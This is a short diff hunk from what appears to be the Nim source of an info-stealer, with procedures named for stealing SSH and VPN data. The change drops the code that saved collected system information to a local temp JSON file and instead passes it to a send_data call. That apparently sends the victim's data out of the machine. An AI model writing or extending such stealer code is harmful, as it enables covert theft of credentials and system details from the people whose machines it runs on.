@@ -44,9 +44,7 @@ proc ssh_stealer_manager()=
 
 proc system_info_manager()=
   let info = getSystemInfo()
-  let outputFile = getTempDir() & "system_info_" & $getCurrentProcessId() & ".json"
-  writeFile(outputFile, pretty(info))
-  echo "[+] Sauvegardé: ", outputFile
+  send_data(info)
 
 
 proc vpn_stealer_manager()=
